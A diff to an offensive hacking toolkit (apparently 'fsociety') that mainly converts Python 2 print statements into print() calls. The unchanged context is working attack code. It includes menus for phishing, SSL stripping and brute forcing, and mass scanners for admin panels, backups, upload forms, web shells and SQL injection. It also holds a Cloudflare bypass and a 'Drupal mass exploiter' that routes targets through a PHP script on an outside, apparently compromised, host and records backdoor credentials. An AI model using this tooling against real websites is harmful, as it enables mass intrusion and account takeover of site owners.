@@ -235,11 +235,9 @@ class sniffingSpoofingMenu:
     def __init__(self):
         clearScr()
         print(self.menuLogo)
-        print(
-            "   {1}--SEToolkit - Tool aimed at penetration testing around Social-Engineering")
+        print("   {1}--SEToolkit - Tool aimed at penetration testing around Social-Engineering")
         print("   {2}--SSLtrip - MITM tool that implements SSL stripping  attacks")
-        print(
-            "   {3}--pyPISHER - Tool to create a mallicious website for password pishing")
+        print("   {3}--pyPISHER - Tool to create a mallicious website for password pishing")
         print("   {4}--SMTP Mailer - Tool to send SMTP mail\n ")
         print("   {99}-Back To Main Menu \n")
         choice6 = raw_input(fsocietyPrompt)
@@ -284,8 +282,7 @@ class webHackingMenu:
         print("   {8}--Shell and Directory Finder")
         print("   {9}--Joomla! 1.5 - 3.4.5 remote code execution")
         print("   {10}-Vbulletin 5.X remote code execution")
-        print(
-            "   {11}-BruteX - Automatically brute force all services running on a target")
+        print("   {11}-BruteX - Automatically brute force all services running on a target")
         print("   {12}-Arachni - Web Application Security Scanner Framework \n ")
         print("   {99}-Back To Main Menu \n")
         choiceweb = raw_input(fsocietyPrompt)
@@ -1191,9 +1188,9 @@ def grabuploadedlink(url):
         for dir in directories:
             currentcode = urllib.urlopen(url + dir).getcode()
             if currentcode == 200 or currentcode == 403:
-                print "-------------------------"
-                print "  [ + ] Found Directory:  " + str(url + dir) + " [ + ]"
-                print "-------------------------"
+                print("-------------------------")
+                print("  [ + ] Found Directory:  " + str(url + dir) + " [ + ]")
+                print("-------------------------")
                 upload.append(url + dir)
     except:
         pass
@@ -1205,10 +1202,9 @@ def grabshell(url):
             for shell in shells:
                 currentcode = urllib.urlopen(upl + shell).getcode()
                 if currentcode == 200:
-                    print "-------------------------"
-                    print "  [ ! ] Found Shell:  " + \
-                        str(upl + shell) + " [ ! ]"
-                    print "-------------------------"
+                    print("-------------------------")
+                    print("  [ ! ] Found Shell:  " + str(upl + shell) + " [ ! ]")
+                    print("-------------------------")
     except:
         pass
 
@@ -1370,7 +1366,7 @@ class Fscan:
     def __init__(self, serverip):
         self.serverip = serverip
         self.getSites(False)
-        print menuu
+        print(menuu)
         while True:
             choice = raw_input(fsocietyPrompt)
             if choice == '1':
@@ -1405,7 +1401,7 @@ class Fscan:
                 exit()
             else:
                 clearScr()
-                print menuu
+                print(menuu)
 
     def getSites(self, a):
         '''
@@ -1439,7 +1435,7 @@ class Fscan:
             clearScr()
             print('[*] Found ', len(lista), ' Website\n')
             for site in self.sites:
-                print site
+                print(site)
 
     def getWordpress(self):
         '''
@@ -1468,7 +1464,7 @@ class Fscan:
         clearScr()
         print('[*] Found ', len(lista), ' Wordpress Website\n')
         for site in lista:
-            print site
+            print(site)
 
     def getJoomla(self):
         '''
@@ -1493,7 +1489,7 @@ class Fscan:
         clearScr()
         print('[*] Found ' + len(lista) + ' Joomla Website\n')
         for site in lista:
-            print site
+            print(site)
 ############################
 # find admin panels
 
@@ -1503,7 +1499,7 @@ class Fscan:
         the attacker may do a lot of vulnerabilty
         tests on the admin area
         '''
-        print "[~] Finding admin panels"
+        print("[~] Finding admin panels")
         adminList = ['admin/', 'site/admin', 'admin.php/', 'up/admin/', 'central/admin/', 'whm/admin/', 'whmcs/admin/', 'support/admin/', 'upload/admin/', 'video/admin/', 'shop/admin/', 'shoping/admin/', 'wp-admin/', 'wp/wp-admin/', 'blog/wp-admin/', 'admincp/', 'admincp.php/', 'vb/admincp/', 'forum/admincp/', 'up/admincp/', 'administrator/',
                      'administrator.php/', 'joomla/administrator/', 'jm/administrator/', 'site/administrator/', 'install/', 'vb/install/', 'dimcp/', 'clientes/', 'admin_cp/', 'login/', 'login.php', 'site/login', 'site/login.php', 'up/login/', 'up/login.php', 'cp.php', 'up/cp', 'cp', 'master', 'adm', 'member', 'control', 'webmaster', 'myadmin', 'admin_cp', 'admin_site']
         clearScr()
@@ -1511,7 +1507,7 @@ class Fscan:
             for admin in adminList:
                 try:
                     if urllib.urlopen(site + admin).getcode() == 200:
-                        print " [*] Found admin panel -> ", site + admin
+                        print(" [*] Found admin panel -> ", site + admin)
                 except IOError:
                     pass
  ############################
@@ -1525,12 +1521,12 @@ class Fscan:
         zipList = ['backup.tar.gz', 'backup/backup.tar.gz', 'backup/backup.zip', 'vb/backup.zip', 'site/backup.zip', 'backup.zip', 'backup.rar', 'backup.sql', 'vb/vb.zip', 'vb.zip', 'vb.sql', 'vb.rar',
                    'vb1.zip', 'vb2.zip', 'vbb.zip', 'vb3.zip', 'upload.zip', 'up/upload.zip', 'joomla.zip', 'joomla.rar', 'joomla.sql', 'wordpress.zip', 'wp/wordpress.zip', 'blog/wordpress.zip', 'wordpress.rar']
         clearScr()
-        print "[~] Finding zip file"
+        print("[~] Finding zip file")
         for site in self.sites:
             for zip1 in zipList:
                 try:
                     if urllib.urlopen(site + zip1).getcode() == 200:
-                        print " [*] Found zip file -> ", site + zip1
+                        print(" [*] Found zip file -> ", site + zip1)
                 except IOError:
                     pass
 
@@ -1543,7 +1539,7 @@ class Fscan:
         upList = ['up.php', 'up1.php', 'up/up.php', 'site/up.php', 'vb/up.php', 'forum/up.php', 'blog/up.php', 'upload.php',
                   'upload1.php', 'upload2.php', 'vb/upload.php', 'forum/upload.php', 'blog/upload.php', 'site/upload.php', 'download.php']
         clearScr()
-        print "[~] Finding Upload"
+        print("[~] Finding Upload")
         for site in self.sites:
             for up in upList:
                 try:
@@ -1551,7 +1547,7 @@ class Fscan:
                         html = urllib.urlopen(site + up).readlines()
                         for line in html:
                             if re.findall('type=file', line):
-                                print " [*] Found upload -> ", site + up
+                                print(" [*] Found upload -> ", site + up)
                 except IOError:
                     pass
 
@@ -1564,7 +1560,7 @@ class Fscan:
         (you can use medusa or hydra)
         '''
         clearScr()
-        print "[~] Grabbing Users"
+        print("[~] Grabbing Users")
         userslist = []
         for site1 in self.sites:
             try:
@@ -1579,11 +1575,11 @@ class Fscan:
                     resp = urllib2.urlopen(
                         site1 + '/cgi-sys/guestbook.cgi?user=%s' % site).read()
                     if 'invalid username' not in resp.lower():
-                        print '\t [*] Found -> ', site
+                        print('\t [*] Found -> ', site)
                         userslist.append(site)
                         break
                     else:
-                        print site
+                        print(site)
 
                     site = site[:-1]
             except:
@@ -1591,7 +1587,7 @@ class Fscan:
 
         clearScr()
         for user in userslist:
-            print user
+            print(user)
 
     def cloudflareBypasser(self):
         '''
@@ -1600,7 +1596,7 @@ class Fscan:
         method from a guy in madleets
         '''
         clearScr()
-        print "[~] Bypassing cloudflare"
+        print("[~] Bypassing cloudflare")
         subdoms = ['mail', 'webmail', 'ftp', 'direct', 'cpanel']
         for site in self.sites:
             site.replace('http://', '')
@@ -1611,11 +1607,12 @@ class Fscan:
                 pass
             for sub in subdoms:
                 doo = sub + '.' + site
-                print ' [~] Trying -> ', doo
+                print(
+                    ' [~] Trying -> ', doo)
                 try:
                     ddd = socket.gethostbyname(doo)
                     if ddd != ip:
-                        print ' [*] Cloudflare bypassed -> ', ddd
+                        print(' [*] Cloudflare bypassed -> ', ddd)
                         break
                 except socket.error:
                     pass
@@ -1630,8 +1627,8 @@ class Fscan:
         try:
             s = 'http://' + self.serverip
             httpresponse = urllib.urlopen(s)
-            print ' [*] Server header -> ', httpresponse.headers.getheader(
-                'server')
+            print(' [*] Server header -> ', httpresponse.headers.getheader(
+                'server'))
         except:
             print('[*] Server header ->  Not Found')
 
@@ -1667,7 +1664,7 @@ class Fscan:
         tool in my blog
         '''
         clearScr()
-        print "[~] Checking SQL injection"
+        print("[~] Checking SQL injection")
         payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><",
                     "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
         check = re.compile(
@@ -1682,7 +1679,7 @@ class Fscan:
                         for line in html:
                             checker = re.findall(check, line)
                             if len(checker) != 0:
-                                print ' [*] SQLi found -> ', power
+                                print(' [*] SQLi found -> ', power)
             except:
                 pass
 
@@ -1693,7 +1690,7 @@ class Fscan:
         or with common ports (al-swisre idea)
         '''
         clearScr()
-        print "[~] Scanning Ports"
+        print("[~] Scanning Ports")
 
         if mode == 1:
             a = ran.split('-')
@@ -1711,7 +1708,7 @@ def do_it(ip, port):
 
     sock = sock.connect_ex((ip, port))
     if sock == 0:
-        print " [*] Port %i is open" % port
+        print(" [*] Port %i is open" % port)
 
 
 ############################
@@ -1744,22 +1741,22 @@ def drupal():
                 urlpa = urlparse(url)
                 site = urlpa.netloc
 
-                print "[+] Testing At " + site
+                print("[+] Testing At " + site)
                 resp = urllib2.urlopen(
                     'http://crig-alda.ro/wp-admin/css/index2.php?url=' + site + '&submit=submit')
                 read = resp.read()
                 if "User: HolaKo" in read:
-                    print "Exploit found =>" + site
+                    print("Exploit found =>" + site)
 
-                    print "user:HolaKo\npass:admin"
+                    print("user:HolaKo\npass:admin")
                     a = open('up.txt', 'a')
                     a.write(site + '\n')
                     a.write("user:" + user + "\npass:" + pwd + "\n")
                 else:
-                    print "[-] Expl Not Found:( "
+                    print("[-] Expl Not Found:( ")
 
             except Exception as ex:
-                print ex
+                print(ex)
                 sys.exit(0)
 
         # Drupal Server ExtraCtor
@@ -1783,7 +1780,7 @@ def getdrupal():
             split = urlparse(url)
             site = split.netloc
             if site not in sites:
-                print site
+                print(site)
                 sites.append(site)
 
         # Drupal Mass List Exploiter
@@ -1800,21 +1797,21 @@ def drupallist():
                 'http://crig-alda.ro/wp-admin/css/index2.php?url=' + url + '&submit=submit')
             readcontent = openurl.read()
             if "Success" in readcontent:
-                print "[+]Success =>" + url
-                print "[-]username:HolaKo\n[-]password:admin"
+                print("[+]Success =>" + url)
+                print("[-]username:HolaKo\n[-]password:admin")
                 save = open('drupal.txt', 'a')
                 save.write(
                     url + "\n" + "[-]username:HolaKo\n[-]password:admin\n")
 
             else:
-                print i + "=> exploit not found "
+                print(i + "=> exploit not found ")
         except Exception as ex:
-            print ex
+            print(ex)
 
 
 def maine():
 
-    print minu
+    print(minu)
     choose = raw_input("choose a number: ")
     while True:
 
@@ -1896,15 +1893,15 @@ def wppjmla():
     wordpress = check_wordpress(sites)
     joomla = check_joomla(sites)
     for ss in wordpress:
-        print ss
-    print '[+] Found ! ', len(wordpress), ' Wordpress Websites'
-    print '-' * 30 + '\n'
+        print(ss)
+    print('[+] Found ! ', len(wordpress), ' Wordpress Websites')
+    print('-' * 30 + '\n')
     for ss in joomla:
-        print ss
+        print(ss)
 
-    print '[+] Found ! ', len(joomla), ' Joomla Websites'
+    print('[+] Found ! ', len(joomla), ' Joomla Websites')
 
-    print '\n'
+    print('\n')
 # initialise the fscan function
 
 ############################
@@ -1912,8 +1909,8 @@ def wppjmla():
 
 def grabsqli(ip):
     try:
-        print color.OKBLUE + "Check_Uplaod... "
-        print '\n'
+        print(color.OKBLUE + "Check_Uplaod... ")
+        print('\n')
 
         page = 1
         while page <= 21:
@@ -2062,32 +2059,32 @@ def wpminiscanner():
     wpeasyupload = check_wpeasyupload(sites)
     wpsymposium = check_wpsymposium(sites)
     for ss in wordpress:
-        print ss
-    print '[*] Found, ', len(wordpress), ' wordpress sites.'
-    print '-' * 30 + '\n'
+        print(ss)
+    print('[*] Found, ', len(wordpress), ' wordpress sites.')
+    print('-' * 30 + '\n')
     for ss in wpstorethemeremotefileupload:
-        print ss
-    print '[*] Found, ', len(
-        wpstorethemeremotefileupload), ' wp_storethemeremotefileupload exploit.'
-    print '-' * 30 + '\n'
+        print(ss)
+    print('[*] Found, ', len(
+        wpstorethemeremotefileupload), ' wp_storethemeremotefileupload exploit.')
+    print('-' * 30 + '\n')
     for ss in wpcontactcreativeform:
-        print ss
-    print '[*] Found, ', len(wpcontactcreativeform), ' wp_contactcreativeform exploit.'
-    print '-' * 30 + '\n'
+        print(ss)
+    print('[*] Found, ', len(wpcontactcreativeform), ' wp_contactcreativeform exploit.')
+    print('-' * 30 + '\n')
     for ss in wplazyseoplugin:
-        print ss
-    print '[*] Found, ', len(wplazyseoplugin), ' wp_lazyseoplugin exploit.'
-    print '-' * 30 + '\n'
+        print(ss)
+    print('[*] Found, ', len(wplazyseoplugin), ' wp_lazyseoplugin exploit.')
+    print('-' * 30 + '\n')
     for ss in wpeasyupload:
-        print ss
-    print '[*] Found, ', len(wpeasyupload), ' wp_easyupload exploit.'
-    print '-' * 30 + '\n'
+        print(ss)
+    print('[*] Found, ', len(wpeasyupload), ' wp_easyupload exploit.')
+    print('-' * 30 + '\n')
     for ss in wpsymposium:
         print ss
 
-    print '[*] Found, ', len(wpsymposium), ' wp_sympsiup exploit.'
+    print('[*] Found, ', len(wpsymposium), ' wp_sympsiup exploit.')
 
-    print '\n'
+    print('\n')
 ############################
 
 
